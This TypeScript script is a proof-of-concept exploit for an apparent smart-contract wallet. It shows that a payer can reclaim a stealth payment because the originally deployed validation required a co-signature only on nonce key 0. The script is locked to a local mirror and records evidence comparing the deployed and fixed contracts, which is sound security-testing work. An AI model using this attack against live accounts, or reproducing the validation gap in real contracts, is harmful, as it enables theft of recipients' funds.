/**
 * The payer of a stealth payment takes it back. The payer knows the whole hash key, so only the co-signature stops this, and the
 * first deployed `validateMaster` only asked for that on nonce key 0. This runs on the mirror only.
 *
 *     vajra stealth-theft         the contract as first deployed
 *     vajra stealth-theft fixed   VajraAccount as it is now
 */
import { randomBytes } from "node:crypto";
import { writeFileSync } from "node:fs";
import { type Address, encodeFunctionData, parseAbi, parseEther } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import {
  DEVNET,
  LEGACY_GAS_PRICE,
  MasterSigner,
  RpcError,
  WOTS_W16,
  createAccount,
  createPayment,
  decodeMeta,
  deployments,
  framesSucceeded,
  isLocalStack,
  memoryStore,
  predictAccount,
  publicClient,
  refusalName,
  signMasterTx,
  stealthCoSigner,
  stealthConfig,
  stealthKeygen,
  stealthWotsSeed,
  submit,
  waitForSuccess,
  walletFor,
} from "@vajra/core";
import { loadOrCreateKey } from "@vajra/core/node";
import { keyPath } from "./deploy.ts";
import { preFixFactory } from "./zk-run.ts";

if (!isLocalStack) throw new Error("this is an attack: it runs on the local mirror only, with VAJRA_STACK=local");

const fixed = process.argv.includes("fixed");
const erc20 = parseAbi(["function balanceOf(address) view returns (uint256)", "function transfer(address, uint256) returns (bool)"]);
const { w16, genesis } = deployments();
const payer = loadOrCreateKey(keyPath("deployer.key"));
const payerAddress = privateKeyToAccount(payer).address;
const usdc = DEVNET.usdc;
const balance = (who: Address) => publicClient.readContract({ address: usdc, abi: erc20, functionName: "balanceOf", args: [who] });
const AMOUNT = 25_000_000n;
const factory = fixed ? w16.factory : await preFixFactory(payer);

// The honest payment. The recipient's keys never reach the payer: only the published meta-address does.
const recipient = stealthKeygen(new Uint8Array(randomBytes(128)));
const meta = decodeMeta(recipient.meta);
const payment = createPayment(meta);
const seed = stealthWotsSeed(payment.ss);
const greedy = new MasterSigner(WOTS_W16, memoryStore(), () => seed);
const config = stealthConfig(greedy.root, stealthCoSigner(meta.spendingPk, payment.ss), genesis);
const account = await predictAccount(factory, config);
await createAccount(payer, factory, config, 0n);
const wallet = walletFor(payer);
const write = (to: Address, amount: bigint) => wallet.writeContract({ address: usdc, abi: erc20, functionName: "transfer", args: [to, amount], gas: 400_000n, gasPrice: LEGACY_GAS_PRICE, type: "legacy", chain: undefined });
await waitForSuccess(await write(account, AMOUNT), "paying the stealth account");
console.log(`${fixed ? "fixed" : "as first deployed"}: stealth account ${account} holds ${await balance(account)}`);

// The theft. A little ETH so the account can pay for itself, then an ordinary master transaction on a keyed nonce.
await waitForSuccess(await wallet.sendTransaction({ to: account, value: parseEther("0.01"), gas: 500_000n, gasPrice: LEGACY_GAS_PRICE, type: "legacy" }), "funding the gas");
const before = await balance(payerAddress);
const { tx } = signMasterTx({
  signer: greedy,
  account,
  epochSalt: genesis,
  calls: [{ target: usdc, data: encodeFunctionData({ abi: erc20, functionName: "transfer", args: [payerAddress, AMOUNT] }), execution: 300_000n, state: 300_000n }],
  maxHashes: 660,
});
let outcome: string;
try {
  const { hash, receipt } = await submit(tx);
  outcome = `mined ${hash}, frames ok: ${framesSucceeded(receipt)}`;
} catch (error) {
  outcome = `REFUSED ${error instanceof RpcError ? refusalName(error.message) : String(error)}`.slice(0, 200);
}
const taken = (await balance(payerAddress)) - before;
console.log(`the payer, with no co-signature, on a keyed nonce: ${outcome}`);
console.log(`taken back: ${taken} of ${AMOUNT}, left in the stealth account: ${await balance(account)}`);
writeFileSync(
  new URL(`../../../docs/evidence/stealth-theft-${fixed ? "fixed-contract" : "deployed-contract"}-latest.json`, import.meta.url),
  JSON.stringify({ ranAt: new Date().toISOString(), stack: "local mirror, with a stand-in token. NOT run on the public devnet", chainId: DEVNET.chainId, contract: fixed ? "VajraAccount, fixed" : "VajraAccount as first deployed", account, outcome, taken: taken.toString(), of: AMOUNT.toString() }, null, 1) + "\n",
);
process.exit(0);
